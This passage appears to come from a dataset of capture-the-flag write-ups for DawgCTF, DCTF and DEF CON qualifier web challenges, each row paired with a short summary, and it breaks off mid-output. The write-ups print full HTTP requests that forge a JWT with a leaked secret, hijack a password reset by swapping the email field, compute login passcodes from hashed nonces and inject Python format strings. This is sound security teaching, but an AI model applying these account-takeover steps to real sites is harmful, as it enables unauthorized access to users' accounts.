  </body>
</html>
```

So there is anything to authenticate there.

Analyzing the [PCAP file](free-wifi.pcap) you can discover on packet #6 the existence of `https://freewifi.ctf.umbccd.io/staff.html` web page.

Connecting to it, you will discover the flag.

```
DawgCTF{w3lc0m3_t0_d@wgs3c_!nt3rn@t!0n@l}
```
","Analyzing the HTML code of the page we can see that there is anything to authenticate there.

Analyzing the  PCAP file you can discover on packet #6 the existence of staff.html web page.

Connecting to it, you will discover the flag.
"
"## Free Wi-Fi Part 2

* **Category:** web/networking
* **Points:** 300

### Challenge

> I saw someone's screen and it looked like they stayed logged in, somehow...
> 
> http://freewifi.ctf.umbccd.io/
> 
> Authors: pleoxconfusa and freethepockets

### Solution

At this point, you can spot two interesting cookies:
* `JWT 'identity'=31337`;
* `JWT 'secret'=""dawgCTF?heckin#bamboozle""`.

Analyzing the capture, you can find two packets, #261 and #263, regarding a JWT-related endpoint.

```
GET /jwtlogin HTTP/1.1
Host: freewifi.ctf.umbccd.io
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cookie: WifiKey nonce=MjAyMC0wNC0wOCAxNzowMg==; session=eyJjc3JmX3Rva2VuIjoiYTg4ZWQxZjVkODhhZTgyZDEzMWY4ODhmZWExZjYwNDRmNTEwMDgyMCJ9.Xo35dQ.zpNEVjf6uG_5vhqwNCE7bS8QEz0
Connection: keep-alive
Upgrade-Insecure-Requests: 1

HTTP/1.0 401 UNAUTHORIZED
Content-Type: application/json
Content-Length: 125
WWW-Authenticate: JWT realm=""Login Required""
Server: Werkzeug/1.0.1 Python/3.6.9
Date: Wed, 08 Apr 2020 17:02:35 GMT

{
  ""description"": ""Request does not contain an access token"", 
  ""error"": ""Authorization Required"", 
  ""status_code"": 401
}
```

You can use [JWT.io website](https://jwt.io/) to craft a valid JWT with `31337` identity and signed with `dawgCTF?heckin#bamboozle` secret.

```
{""alg"":""HS256"",""typ"":""JWT""}.{""identity"":31337,""iat"":1586564945,""nbf"":1586564945,""exp"":1586908800}.Hx0gLrzRZy4lGdEhvV_eIpdpSSa_pd6FQVBy1pMVNPE

eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZGVudGl0eSI6MzEzMzcsImlhdCI6MTU4NjU2NDk0NSwibmJmIjoxNTg2NTY0OTQ1LCJleHAiOjE1ODY5MDg4MDB9.Hx0gLrzRZy4lGdEhvV_eIpdpSSa_pd6FQVBy1pMVNPE
```

Calling the endpoint with the JWT in the `Authorization` header will give you the flag.

```
GET /jwtlogin HTTP/1.1
Host: freewifi.ctf.umbccd.io
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Cookie: WifiKey nonce=MjAyMC0wNC0xMSAwMDoxNg==; WifiKey alg=SHA1; session=eyJjc3JmX3Rva2VuIjoiYTA2MmZkNTUyNzM3NmQwMTAxYTc4YzgwMmFlNmFkOTI5ZGQzNzU3OCJ9.XpD3NA.zDj47SdpKQnikt--V9WnN0zUmYQ; JWT 'identity'=31337; JWT 'secret'=""dawgCTF?heckin#bamboozle""
Authorization: JWT eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZGVudGl0eSI6MzEzMzcsImlhdCI6MTU4NjU2NDk0NSwibmJmIjoxNTg2NTY0OTQ1LCJleHAiOjE1ODY5MDg4MDB9.Hx0gLrzRZy4lGdEhvV_eIpdpSSa_pd6FQVBy1pMVNPE
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0

HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Sat, 11 Apr 2020 00:35:23 GMT
Content-Type: text/html; charset=utf-8
Connection: close
Content-Length: 27

DawgCTF{y0u_d0wn_w!t#_JWT?}
```
","At this point, you can spot two interesting cookies.

Analyzing the capture, you can find two packets, regarding a JWT-related endpoint.

You can use JWT.io to craft a valid JWT.

Calling the endpoint with the JWT in the `Authorization` header will give you the flag.
"
"## Free Wi-Fi Part 3

* **Category:** web/networking
* **Points:** 200

### Challenge

> Let's steal someone's account.
> 
> http://freewifi.ctf.umbccd.io/
> 
> Authors: pleoxconfusa and freethepockets

### Solution

The authentication page discovered during the previous step is the following.

```html
<!DOCTYPE html>
<html>
  <head>
    <title>
Staff Wifi Login Page
</title>
    <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">

    <!-- Bootstrap -->
    <link href=""/static/bootstrap/css/bootstrap.min.css?bootstrap=3.3.7.1.dev1"" rel=""stylesheet"">
	<link rel=""stylesheet"" href=""/static/css/main.css"">

  </head>
  <body>
    
    

<div class=""container"">
  <div class=""row"">
    <div align=""center"" class=""col-xs-12"">

      <h1>Welcome to the staff login page!</h1>

      <div align=""left"" style=""background-color: lightgrey; width: 500px;  padding: 50px;  margin: 20px;"">

        <h3 style=""color:blue;"">Staff login</h3>

      	<p>You may use either of the following methods to logon.</p>
	
	<div style=""margin:15px;"">

      	
<form action="""" method=""post""
  class=""form"" role=""form"">
  <input id=""csrf_token"" name=""csrf_token"" type=""hidden"" value=""ImEwNjJmZDU1MjczNzZkMDEwMWE3OGM4MDJhZTZhZDkyOWRkMzc1Nzgi.XpD32g.A831bot0d-EhyWIW6fNX3jqIz9E"">
  
    




<div class=""form-group ""><label class=""control-label"" for=""username"">Username:</label>
        
          <input class=""form-control"" id=""username"" name=""username"" type=""text"" value="""">
        
  </div>


    




<div class=""form-group ""><label class=""control-label"" for=""password"">Password:</label>
        
          <input class=""form-control"" id=""password"" name=""password"" type=""password"" value="""">
        
  </div>


    





  

  
  


    <input class=""btn btn-default"" id=""submit"" name=""submit"" type=""submit"" value=""Submit"">
  




    

</form>

      	<br/>

      	<p><a href=""forgotpassword.html"">Forgot your password?</a></p>

      	<h3> OR </h3>

      	
<form action="""" method=""post""
  class=""form"" role=""form"">
  <input id=""csrf_token"" name=""csrf_token"" type=""hidden"" value=""ImEwNjJmZDU1MjczNzZkMDEwMWE3OGM4MDJhZTZhZDkyOWRkMzc1Nzgi.XpD32g.A831bot0d-EhyWIW6fNX3jqIz9E"">
  
    






<div class=""form-group  required""><label class=""control-label"" for=""passcode"">Login with WifiKey:</label>
        
          <input class=""form-control"" id=""passcode"" name=""passcode"" required type=""text"" value="""">
        
  </div>


    





  

  
  


    <input class=""btn btn-default"" id=""submit"" name=""submit"" type=""submit"" value=""Submit"">
  




    

</form>

	</div>

      </div>

      	<p class=""space-above""><strong>DawgCTF{w3lc0m3_t0_d@wgs3c_!nt3rn@t!0n@l}</strong></p>

    </div>
  </div>
</div>



    
    <script src=""/static/bootstrap/jquery.min.js?bootstrap=3.3.7.1.dev1""></script>
    <script src=""/static/bootstrap/js/bootstrap.min.js?bootstrap=3.3.7.1.dev1""></script>
  </body>
</html>
```

Analyzing the [PCAP file](free-wifi.pcap), some interesting packets can be found: #469, #471 and #473.

```
POST /forgotpassword.html HTTP/1.1
Host: freewifi.ctf.umbccd.io
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://freewifi.ctf.umbccd.io/forgotpassword.html
Content-Type: application/x-www-form-urlencoded
Content-Length: 171
Cookie: WifiKey nonce=MjAyMC0wNC0wOCAxNzowMw==; session=eyJjc3JmX3Rva2VuIjoiYTg4ZWQxZjVkODhhZTgyZDEzMWY4ODhmZWExZjYwNDRmNTEwMDgyMCJ9.Xo35dQ.zpNEVjf6uG_5vhqwNCE7bS8QEz0
Connection: keep-alive
Upgrade-Insecure-Requests: 1

user=true.grit%40umbccd.io&csrf_token=ImE4OGVkMWY1ZDg4YWU4MmQxMzFmODg4ZmVhMWY2MDQ0ZjUxMDA4MjAi.Xo4F8w.YzjziKX2qgE4hJ5QKC6qTjP2-0M&email=true.grit%40umbccd.io&submit=Submit

HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 2420
Vary: Cookie
Server: Werkzeug/1.0.1 Python/3.6.9
Date: Wed, 08 Apr 2020 17:12:19 GMT

<!DOCTYPE html>
<html>
  <head>
    <title>
Forgot your password?
</title>
    <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">

    <!-- Bootstrap -->
    <link href=""/static/bootstrap/css/bootstrap.min.css?bootstrap=3.3.7.1.dev1"" rel=""stylesheet"">
	<link rel=""stylesheet"" href=""/static/css/main.css"">

  </head>
  <body>
    
    

<div class=""container"">
  <div class=""row"">
    <div class=""col-xs-12"">

      <h1>Forgot your password?</h1>

      <p class=""lead"">Please enter your email address.</p>
      
<form action="""" method=""post""
  class=""form"" role=""form"">
  <input id=""user"" name=""user"" type=""hidden"" value="""">
<input id=""csrf_token"" name=""csrf_token"" type=""hidden"" value=""ImE4OGVkMWY1ZDg4YWU4MmQxMzFmODg4ZmVhMWY2MDQ0ZjUxMDA4MjAi.Xo4F8w.YzjziKX2qgE4hJ5QKC6qTjP2-0M"">
  
    






<div class=""form-group  required""><label class=""control-label"" for=""email"">Enter your email:</label>
        
          <input class=""form-control"" id=""email"" name=""email"" required type=""text"" value="""">
        
  </div>


    
    





  

  
  


    <input class=""btn btn-default"" id=""submit"" name=""submit"" type=""submit"" value=""Submit"">
  




    

</form>
      <script type=""text/javascript"">
      window.onload = function()
      {
        document.getElementsByClassName('form')[0].onsubmit = function() {
          alert(1)
          var email = document.getElementById('email')
          var user = document.getElementById('user')
          user.value = email.value
        }
      }
      </script>
      <p class=""space-above""><strong>Check your email for password reset link.</strong></p>

    </div>
  </div>
</div>

<!--
TIPS about using Flask-Bootstrap:
Flask-Bootstrap keeps the default Bootstrap stylesheet in the
env/lib/python3.5/site-packages/flask_bootstrap/static/css/ directory.
You can replace the CSS file. HOWEVER, when you reinstall requirements
for your project, you would overwrite all the Bootstrap files
with the defaults.
Flask-Bootstrap templates are in
env/lib/python3.5/site-packages/flask_bootstrap/static/templates
Modifying the Bootstrap base.html template: use directives and
Jinja2's super() function. See Jinja2 documentation and also this:
https://pythonhosted.org/Flask-Bootstrap/basic-usage.html
-->



    
    <script src=""/static/bootstrap/jquery.min.js?bootstrap=3.3.7.1.dev1""></script>
    <script src=""/static/bootstrap/js/bootstrap.min.js?bootstrap=3.3.7.1.dev1""></script>
  </body>
</html>
```

You have discovered that:
1. a `/forgotpassword.html` page exists;
2. `true.grit@umbccd.io` is a user of the system;
3. the forgot password functionality uses two different fields for username and e-mail, with a JavaScript code to copy the value inserted into the input field.

As a consequence, it is sufficient to intercept the request and change the e-mail with one you control, leaving the discovered username.

```
POST /forgotpassword.html HTTP/1.1
Host: freewifi.ctf.umbccd.io
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 171
Origin: https://freewifi.ctf.umbccd.io
Connection: close
Referer: https://freewifi.ctf.umbccd.io/forgotpassword.html
Cookie: WifiKey nonce=MjAyMC0wNC0xMCAyMzozNA==; WifiKey alg=SHA1; session=eyJjc3JmX3Rva2VuIjoiYTA2MmZkNTUyNzM3NmQwMTAxYTc4YzgwMmFlNmFkOTI5ZGQzNzU3OCJ9.XpD3NA.zDj47SdpKQnikt--V9WnN0zUmYQ; JWT 'identity'=31337
Upgrade-Insecure-Requests: 1

user=true.grit%40umbccd.io&csrf_token=ImEwNjJmZDU1MjczNzZkMDEwMWE3OGM4MDJhZTZhZDkyOWRkMzc1Nzgi.XpEDtg.QX6HWsJN_M2Apsv3wUSKn4AIhl4&email=m3ssap0%40yopmail.com&submit=Submit

HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Fri, 10 Apr 2020 23:40:06 GMT
Content-Type: text/html; charset=utf-8
Connection: close
Vary: Cookie
Content-Length: 2018

<!DOCTYPE html>
<html>
  <head>
    <title>
Forgot your password?
</title>
    <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">

    <!-- Bootstrap -->
    <link href=""/static/bootstrap/css/bootstrap.min.css?bootstrap=3.3.7.1.dev1"" rel=""stylesheet"">
	<link rel=""stylesheet"" href=""/static/css/main.css"">

  </head>
  <body>
    
    

<div class=""container"">
  <div class=""row"">
    <div align=""center"" class=""col-xs-12"">

      <h1>Forgot your password?</h1>

      <div align=""left"" style=""background-color: lightgrey; width: 500px;  padding: 50px;  margin: 20px;"">
        <h3 style=""color:blue;"">Password recovery</h3>
      	
<form action="""" method=""post""
  class=""form"" role=""form"">
  <input id=""user"" name=""user"" type=""hidden"" value=""true.grit@umbccd.io"">
<input id=""csrf_token"" name=""csrf_token"" type=""hidden"" value=""ImEwNjJmZDU1MjczNzZkMDEwMWE3OGM4MDJhZTZhZDkyOWRkMzc1Nzgi.XpED1g.iElwyWg_AQH1c72HhtcOPZVr02s"">
  
    






<div class=""form-group  required""><label class=""control-label"" for=""email"">Enter your email:</label>
        
          <input class=""form-control"" id=""email"" name=""email"" required type=""text"" value=""m3ssap0@yopmail.com"">
        
  </div>


    
    





  

  
  


    <input class=""btn btn-default"" id=""submit"" name=""submit"" type=""submit"" value=""Submit"">
  




    

</form>
      	<script type=""text/javascript"">
      	window.onload = function()
      	{
          document.getElementsByClassName('form')[0].onsubmit = function() {
            var email = document.getElementById('email')
            var user = document.getElementById('user')
            user.value = email.value
          }
      	}
        </script>
        <p class=""space-above""><strong>DawgCTF{cl!3nt_s1d3_v@l!d@t!0n_1s_d@ng3r0u5}</strong></p>
      </div>
    </div>
  </div>
</div>




    
    <script src=""/static/bootstrap/jquery.min.js?bootstrap=3.3.7.1.dev1""></script>
    <script src=""/static/bootstrap/js/bootstrap.min.js?bootstrap=3.3.7.1.dev1""></script>
  </body>
</html>
```

The flag is the following.

```
DawgCTF{cl!3nt_s1d3_v@l!d@t!0n_1s_d@ng3r0u5}
```
","The authentication page discovered during the previous step is the following.

Analyzing the PCAP file some interesting packets can be found.

You have discovered that: a `/forgotpassword.html` page exists, a user of the system and the forgot password functionality uses two different fields for username and e-mail, with a JavaScript code to copy the value inserted into the input field.

As a consequence, it is sufficient to intercept the request and change the e-mail with one you control, leaving the discovered username.

[HTTP POST request sent to the ""/forgotpassword.html"" endpoint with some form data in the request body, including an email address, and a CSRF token.]

The server response will contain the flag.

"
"## Free Wi-Fi Part 4

* **Category:** web/networking
* **Points:** 250

### Challenge

> People seem to have some doohickey that lets them login with a code...
> 
> http://freewifi.ctf.umbccd.io/
> 
> Authors: pleoxconfusa and freethepockets

### Solution

Connecting to the web site, two interesting cookies are set:

```
Set-Cookie: WifiKey nonce=MjAyMC0wNC0xMCAyMzo1Mg==; Path=/
Set-Cookie: WifiKey alg=SHA1; Path=/
```

Analyzing the [PCAP file](free-wifi.pcap), some POST requests passing `passcode` value can be found. Considering the SHA-1 algorithm discovered before in the cookie value and applying that algorithm to the wi-fi nonces captured, you will discover that `passcode` values are just the first 8 chars of the hashed `nonce` value.

```
#85
Cookie: WifiKey nonce=MjAyMC0wNC0wOCAxNzowMQ==  -> 2020-04-08 17:01
passcode=5004f47a
SHA-1(MjAyMC0wNC0wOCAxNzowMQ==) = 5004f47ae3e2e7c1c9a5ea4d1666f95e6b06b062

#217
Cookie: WifiKey nonce=MjAyMC0wNC0wOCAxNzowMg==  -> 2020-04-08 17:02
passcode=01c7aeb1
SHA-1(MjAyMC0wNC0wOCAxNzowMg==) = 01c7aeb11b1ee82035e9dc9e0292088d559921b1

#339
Cookie: WifiKey nonce=MjAyMC0wNC0wOCAxNzowMw==  -> 2020-04-08 17:03
passcode=097b3acf
SHA-1(MjAyMC0wNC0wOCAxNzowMw==) = 097b3acf84e6ed9e66f285cf3750b4ff89da48dc

#655
Cookie: WifiKey nonce=MjAyMC0wNC0wOCAxNzoxMw==  -> 2020-04-08 17:13
passcode=54f03ae2
SHA-1(MjAyMC0wNC0wOCAxNzoxMw==) = 54f03ae2cc8d1415bf06dec1670e03fd4e696982
```

The same process can be applied to your `nonce`.

```
Cookie: WifiKey nonce=MjAyMC0wNC0xMSAwMDowNw== -> 2020-04-11 00:07
SHA-1(MjAyMC0wNC0xMSAwMDowNw==) = ef07d9f7a0f3cce235a644fbb8392f211025aa98
passcode=ef07d9f7
```

In order to perform a request.

```
POST /staff.html HTTP/1.1
Host: freewifi.ctf.umbccd.io
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 134
Origin: https://freewifi.ctf.umbccd.io
Connection: close
Referer: https://freewifi.ctf.umbccd.io/staff.html
Cookie: WifiKey nonce=MjAyMC0wNC0xMSAwMDowNw==; WifiKey alg=SHA1; session=eyJjc3JmX3Rva2VuIjoiYTA2MmZkNTUyNzM3NmQwMTAxYTc4YzgwMmFlNmFkOTI5ZGQzNzU3OCJ9.XpD3NA.zDj47SdpKQnikt--V9WnN0zUmYQ; JWT 'identity'=31337
Upgrade-Insecure-Requests: 1

csrf_token=ImEwNjJmZDU1MjczNzZkMDEwMWE3OGM4MDJhZTZhZDkyOWRkMzc1Nzgi.XpEKKA.bAfOYEeMNYEl-nFUD9XT9rSH0YI&passcode=ef07d9f7&submit=Submit

HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Sat, 11 Apr 2020 00:07:25 GMT
Content-Type: text/html; charset=utf-8
Connection: close
Set-Cookie: WifiKey nonce=MjAyMC0wNC0xMSAwMDowNw==; Path=/
Set-Cookie: WifiKey alg=SHA1; Path=/
Set-Cookie: JWT 'secret'=""dawgCTF?heckin#bamboozle""; Path=/
Vary: Cookie
Content-Length: 2594

<!DOCTYPE html>
<html>
  <head>
    <title>
Staff Wifi Login Page
</title>
    <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">

    <!-- Bootstrap -->
    <link href=""/static/bootstrap/css/bootstrap.min.css?bootstrap=3.3.7.1.dev1"" rel=""stylesheet"">
	<link rel=""stylesheet"" href=""/static/css/main.css"">

  </head>
  <body>
    
    

<div class=""container"">
  <div class=""row"">
    <div align=""center"" class=""col-xs-12"">

      <h1>Welcome to the staff login page!</h1>

      <div align=""left"" style=""background-color: lightgrey; width: 500px;  padding: 50px;  margin: 20px;"">

        <h3 style=""color:blue;"">Staff login</h3>

      	<p>You may use either of the following methods to logon.</p>
	
	<div style=""margin:15px;"">

      	
<form action="""" method=""post""
  class=""form"" role=""form"">
  <input id=""csrf_token"" name=""csrf_token"" type=""hidden"" value=""ImEwNjJmZDU1MjczNzZkMDEwMWE3OGM4MDJhZTZhZDkyOWRkMzc1Nzgi.XpEKPQ.xW__Gp06GnXV1BdSSbKG-ZgPtyI"">
  
    




<div class=""form-group ""><label class=""control-label"" for=""username"">Username:</label>
        
          <input class=""form-control"" id=""username"" name=""username"" type=""text"" value="""">
        
  </div>


    




<div class=""form-group ""><label class=""control-label"" for=""password"">Password:</label>
        
          <input class=""form-control"" id=""password"" name=""password"" type=""password"" value="""">
        
  </div>


    





  

  
  


    <input class=""btn btn-default"" id=""submit"" name=""submit"" type=""submit"" value=""Submit"">
  




    

</form>

      	<br/>

      	<p><a href=""forgotpassword.html"">Forgot your password?</a></p>

      	<h3> OR </h3>

      	
<form action="""" method=""post""
  class=""form"" role=""form"">
  <input id=""csrf_token"" name=""csrf_token"" type=""hidden"" value=""ImEwNjJmZDU1MjczNzZkMDEwMWE3OGM4MDJhZTZhZDkyOWRkMzc1Nzgi.XpEKPQ.xW__Gp06GnXV1BdSSbKG-ZgPtyI"">
  
    






<div class=""form-group  required""><label class=""control-label"" for=""passcode"">Login with WifiKey:</label>
        
          <input class=""form-control"" id=""passcode"" name=""passcode"" required type=""text"" value=""ef07d9f7"">
        
  </div>


    





  

  
  


    <input class=""btn btn-default"" id=""submit"" name=""submit"" type=""submit"" value=""Submit"">
  




    

</form>

	</div>

      </div>

      	<p class=""space-above""><strong>DawgCTF{k3y_b@s3d_l0g1n!}</strong></p>

    </div>
  </div>
</div>



    
    <script src=""/static/bootstrap/jquery.min.js?bootstrap=3.3.7.1.dev1""></script>
    <script src=""/static/bootstrap/js/bootstrap.min.js?bootstrap=3.3.7.1.dev1""></script>
  </body>
</html>
```

The flag is the following.

```
DawgCTF{k3y_b@s3d_l0g1n!}
```
","Connecting to the web site, two interesting cookies are set.

Analyzing the PCAP file some POST requests passing `passcode` value can be found. 
Considering the SHA-1 algorithm discovered before in the cookie value and applying that algorithm to the wi-fi nonces captured, you will discover that `passcode` values are just the first 8 chars of the hashed `nonce` value.

The same process can be applied to your `nonce` in order to perform a POST request.

The server response will contain the flag.


"
"## The Lady is a Smuggler

* **Category:** web/networking
* **Points:** 25

### Challenge

> Our mysterious lady is smuggling a bit of extra information.
> 
> https://clearedge.ctf.umbccd.io/
> 
> Author: ClearEdge

### Solution

The interesting part is the following.

```html
<img src=""https://media.defense.gov/2018/Sep/03/2001961221/400/400/0/180903-D-IM742-2028.JPG?flag=DawgCTF{ClearEdge_ElizebethSmith)"">
```

The flag is the following.

```
DawgCTF{ClearEdge_ElizebethSmith}
```
","Analyzing the HTML code we can notice:

[HTML image tag that displays an image with the specified source URL, a query string appended containing the flag.]
"
"## Tracking

* **Category:** web/networking
* **Points:** 100

### Challenge

> What's that pixel tracking?
> 
> https://clearedge.ctf.umbccd.io/
> 
> Author: ClearEdge

### Solution

The interesting part is the following.

```html
<img src="".."" height=""1px"" width=""1px"" onclick=""alert(String.fromCharCode(68,97,119,103,67,84,70,123,67,108,101,97,114,69,100,103,101,95,117,110,105,125))"" >
```

Using browser console to run the JavaScript will give you the flag.

```
DawgCTF{ClearEdge_uni}
```
","Analyzing the HTML code we can notice:

[HTML code for an invisible image element that triggers an alert when clicked. The alert message is encoded using ASCII character codes.]

Using browser console to run the JavaScript will give you the flag."
"# DCTF DEF CAMP Qualif 2018 – PasswordPolicy

* **Category:** web
* **Points:** 1

## Challenge

> Can you guess this extreme password?
>
> Target: [https://password-policy.dctfq18.def.camp/](https://password-policy.dctfq18.def.camp/)

## Solution

The target website contains a login form with a JavaScript check used to prevent the submission of long passwords.

```javascript
    $('form').submit(function(e) {
      if($('input[name=""pass""]').val().length < 1337) {
          alert('Minimum length for password is 1337 characters.');
          e.preventDefault();
          return false;
      }
  });
```

JavaScript can be easily disabled from the browser (or a proxy tool can be used to intercept and repeat the request) in order to bypass this check.

Using a common password, i.e. `password`, will reveal the flag:

```
DCTF{db95ace20ae3972f87d758a3724142ae93735c442a8482f9717fe4a9bb94d337}
```","The target website contains a login form with a JavaScript check used to prevent the submission of long passwords.

JavaScript can be easily disabled from the browser (or a proxy tool can be used to intercept and repeat the request) in order to bypass this check.

Using a common password, i.e. `password`, will reveal the flag."
"# DEF CON CTF Qualifier 2020 – dogooos

* **Category:** web
* **Points:** 151

## Challenge

> DogOOOs is a new website where members can rate pictures of dogs. We think there might still be a few bugs, can you check it out? In this challenge, the flag is located in the root directory of the server at /flag.
> 
> http://dogooos.challenges.ooo:37453
> 
> dogooos.challenges.ooo 37453
> 
> Files:
> 
> [dogooo_comments.py](dogooo_comments.py) a881e06d1d70809ffdc9149a5be5b5de6796542f2ed2225fd43d451fde2c8c78
> 
> [loaddata.py](loaddata.py) 0b57622ec86e02c0d8726538161dffb1e13ba1a18b7538354c12f762e4947c23

[Official solution here.](https://github.com/o-o-overflow/dc2020q-dogooos-public)

## Solution

The website allows you to upload and comment pictures of dogs.

There is an interesting endpoint at `/dogooo/runcmd` that contains a remote shell functionality, but it can't be used due to an `HTTP 502 Bad Gateway` error caused by the presence of `seccomp` filter, which prevents `execve`.

Several functionalities can be used only by authenticated users (i.e. `@login_required` annotations). There is an endpoint that can be used to create new users (i.e. `/dogooo/user/create`), but even this functionality requires the login.

A public functionality is the `/dogooo/deets/<postid>` that can be used to insert a new comment under a picture.

The comment is inserted with a two-step procedure:
1. the comment is inserted like a preview and showed into the webpage;
2. the content of the comment is strictly validated and inserted into the database.

Analyzing the code for the first step, in the [loaddata.py](loaddata.py) file, an interesting line of code can be found into `get_comments` function.

```python
def get_comments(self):
    out = """"
    for ccnt, cmt in enumerate(self.comments):
        fmt_cmt = cmt.comment.format(rating=self.__dict__)
        form_save = f""""""
            <form action=""/dogooo/deets/add/{self.id}"" method=""POST"">
                <input type=hidden id=""comment"" name=""comment"" value='{fmt_cmt}'></textarea>
                <input type=hidden id=""commenter"" name=""commenter"" value='{cmt.author}'/>
                <input type=submit value=""Save"" />
            </form>
        """"""
        if cmt.preview:
            out += f""<ul class='square'>{fmt_cmt} - {cmt.author} {form_save} </ul>\n""
        else:
            out += f""<ul class='square'>{fmt_cmt} - {cmt.author}</ul>\n""

    return out
```

The interesting line is the following.

```
fmt_cmt = cmt.comment.format(rating=self.__dict__)
```

It seems that if you use a format string like `{rating}` into the comment text, then the content of `self.__dict__` can be printed.

Trying it, the following content will be printed into the preview webpage.

```html
<ul class='square'>{'id': 3, 'rating': 13, '_message': ""This is Griffey. His St. Patrick's Day bow tie didn't arrive until this morning. Politely requests that everyone celebrate again. 13/10"", 'pic_loc': 'images/img_3.jpg', 'author': 'demidog', 'comments': [<app.loaddata.Comment object at 0x7fc4eaadf160>, <app.loaddata.Comment object at 0x7fc4eaadf1f0>, <app.loaddata.Comment object at 0x7fc4eaadf1c0>, <app.loaddata.Comment object at 0x7fc4eaadf280>, <app.loaddata.Comment object at 0x7fc4eaadf3d0>, <app.loaddata.Comment object at 0x7fc4eaadf430>, <app.loaddata.Comment object at 0x7fc4eaadf490>, <app.loaddata.Comment object at 0x7fc4eaadf4f0>, <app.loaddata.Comment object at 0x7fc4eaadf550>, <app.loaddata.Comment object at 0x7fc4eaadf5b0>, <app.loaddata.Comment object at 0x7fc4eaadf610>, <app.loaddata.Comment object at 0x7fc4eaadf670>, <app.loaddata.Comment object at 0x7fc4eaadf6d0>, <app.loaddata.Comment object at 0x7fc4eaadf730>, <app.loaddata.Comment object at 0x7fc4eaadf790>, <app.loaddata.Comment object at 0x7fc4eaadf7f0>, <app.loaddata.Comment object at 0x7fc4eaadf850>, <app.loaddata.Comment object at 0x7fc4eaadf8b0>, <app.loaddata.Comment object at 0x7fc4eaadf910>, <app.loaddata.Comment object at 0x7fc4eaadf970>, <app.loaddata.Comment object at 0x7fc4eaadf9d0>, <app.loaddata.Comment object at 0x7fc4eaadfa30>, <app.loaddata.Comment object at 0x7fc4eaadfa90>, <app.loaddata.Comment object at 0x7fc4eaadfaf0>, <app.loaddata.Comment object at 0x7fc4eaadfb50>, <app.loaddata.Comment object at 0x7fc4eaadfbb0>, <app.loaddata.Comment object at 0x7fc4eaadfc10>, <app.loaddata.Comment object at 0x7fc4eaadfc70>, <app.loaddata.Comment object at 0x7fc4eaadfcd0>, <app.loaddata.Comment object at 0x7fc4eaadfd30>, <app.loaddata.Comment object at 0x7fc4eaadfd90>, <app.loaddata.Comment object at 0x7fc4eaadfdf0>, <app.loaddata.Comment object at 0x7fc4eaadfe50>, <app.loaddata.Comment object at 0x7fc4eaadfeb0>, <app.loaddata.Comment object at 0x7fc4eaadff10>, <app.loaddata.Comment object at 0x7fc4eaadff70>, <app.loaddata.Comment object at 0x7fc4eaadffd0>, <app.loaddata.Comment object at 0x7fc4eaae6070>, <app.loaddata.Comment object at 0x7fc4eaae60d0>, <app.loaddata.Comment object at 0x7fc4eaae6130>, <app.loaddata.Comment object at 0x7fc4eaae6190>, <app.loaddata.Comment object at 0x7fc4eaae61f0>, <app.loaddata.Comment object at 0x7fc4eaae6250>, <app.loaddata.Comment object at 0x7fc4eaae62b0>, <app.loaddata.Comment object at 0x7fc4eaae6310>, <app.loaddata.Comment object at 0x7fc4eaae6370>, <app.loaddata.Comment object at 0x7fc4eaae63d0>, <app.loaddata.Comment object at 0x7fc4eaae6430>, <app.loaddata.Comment object at 0x7fc4eaae6490>, <app.loaddata.Comment object at 0x7fc4eaae64f0>, <app.loaddata.Comment object at 0x7fc4eaae6550>, <app.loaddata.Comment object at 0x7fc4eaae65b0>, <app.loaddata.Comment object at 0x7fc4eaae6610>, <app.loaddata.Comment object at 0x7fc4eaae6670>, <app.loaddata.Comment object at 0x7fc4eaae66d0>, <app.loaddata.Comment object at 0x7fc4eaae6730>, <app.loaddata.Comment object at 0x7fc4eaae6790>, <app.loaddata.Comment object at 0x7fc4eaae67f0>, <app.loaddata.Comment object at 0x7fc4eaae6850>, <app.loaddata.Comment object at 0x7fc4eaae68b0>, <app.loaddata.Comment object at 0x7fc4eaae6910>, <app.loaddata.Comment object at 0x7fc4eaae6970>, <app.loaddata.Comment object at 0x7fc4eaae69d0>, <app.loaddata.Comment object at 0x7fc4eaae6a30>, <app.loaddata.Comment object at 0x7fc4eaae6a90>, <app.loaddata.Comment object at 0x7fc4eaae6af0>, <app.loaddata.Comment object at 0x7fc4eaae6b50>, <app.loaddata.Comment object at 0x7fc4eaae6bb0>, <app.loaddata.Comment object at 0x7fc4eaae6c10>, <app.loaddata.Comment object at 